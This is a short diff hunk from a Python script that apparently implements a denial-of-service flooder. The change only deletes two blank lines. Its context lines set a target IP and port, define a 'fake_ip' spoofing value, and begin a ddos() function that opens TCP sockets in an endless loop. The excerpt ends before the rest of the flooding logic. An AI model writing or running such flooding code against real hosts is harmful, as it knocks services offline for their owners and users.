@@ -5,8 +5,6 @@ import socket
 target = "192.168.8.1"
 port = 80
 fake_ip = "182.21.20.32"
-
-
 def ddos():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
